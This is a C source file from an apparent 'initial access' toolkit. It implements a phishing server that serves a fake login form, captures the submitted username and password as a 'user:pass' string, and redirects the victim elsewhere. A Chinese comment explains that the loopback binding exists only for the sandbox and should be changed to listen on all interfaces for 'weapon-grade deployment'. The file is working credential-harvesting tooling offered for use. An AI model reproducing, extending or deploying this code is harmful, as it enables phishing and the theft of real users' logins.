#include "initial_access.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define BACKLOG 4

static const char HTML_FORM[] =
    "<html><body>"
    "<form method=\"POST\" action=\"/login\">"
    "<input name=\"user\" placeholder=\"username\">"
    "<input name=\"pass\" type=\"password\" placeholder=\"password\">"
    "<button type=\"submit\">Login</button>"
    "</form></body></html>";

int phish_listen(uint16_t port) {
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return -1;

    int on = 1;
    setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &on, sizeof(on));

    struct sockaddr_in sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    /* 沙盒仅放行回环；武器级部署时改为 htonl(INADDR_ANY) */
    sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);

    if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) { close(fd); return -1; }
    if (listen(fd, BACKLOG) < 0) { close(fd); return -1; }
    return fd;
}

int phish_listen_port(int fd) {
    struct sockaddr_in sa;
    socklen_t len = sizeof(sa);
    if (getsockname(fd, (struct sockaddr *)&sa, &len) < 0) return -1;
    return ntohs(sa.sin_port);
}

static void send_all(int fd, const char *buf, size_t len) {
    size_t off = 0;
    while (off < len) {
        ssize_t n = send(fd, buf + off, len - off, 0);
        if (n <= 0) return;
        off += (size_t)n;
    }
}

int phish_serve_once(int lfd, const char *redirect_url,
                     char *creds, size_t creds_cap) {
    if (lfd < 0 || !redirect_url || !creds || creds_cap == 0) return -1;

    int cfd = accept(lfd, NULL, NULL);
    if (cfd < 0) return -1;

    char buf[2048];
    ssize_t n = recv(cfd, buf, sizeof(buf) - 1, 0);
    if (n <= 0) { close(cfd); return -1; }
    buf[n] = '\0';

    int is_post = (strncmp(buf, "POST", 4) == 0);
    char resp[512];

    if (!is_post) {
        int len = snprintf(resp, sizeof(resp),
            "HTTP/1.1 200 OK\r\n"
            "Content-Type: text/html\r\n"
            "Content-Length: %zu\r\n"
            "Connection: close\r\n\r\n", strlen(HTML_FORM));
        send_all(cfd, resp, (size_t)len);
        send_all(cfd, HTML_FORM, strlen(HTML_FORM));
        close(cfd);
        return 0;
    }

    /* POST：定位 body 并提取 user= / pass= */
    const char *body = strstr(buf, "\r\n\r\n");
    if (!body) { close(cfd); return -1; }
    body += 4;

    const char *u = strstr(body, "user=");
    const char *p = strstr(body, "pass=");
    char user[128] = {0}, pass[128] = {0};

    if (u) {
        u += 5;
        size_t i = 0;
        while (u[i] && u[i] != '&' && i < sizeof(user) - 1) { user[i] = u[i]; i++; }
        user[i] = '\0';
    }
    if (p) {
        p += 5;
        size_t i = 0;
        while (p[i] && p[i] != '&' && i < sizeof(pass) - 1) { pass[i] = p[i]; i++; }
        pass[i] = '\0';
    }
    snprintf(creds, creds_cap, "%s:%s", user, pass);

    int len = snprintf(resp, sizeof(resp),
        "HTTP/1.1 302 Found\r\n"
        "Location: %s\r\n"
        "Content-Length: 0\r\n"
        "Connection: close\r\n\r\n", redirect_url);
    send_all(cfd, resp, (size_t)len);
    close(cfd);
    return 0;
}
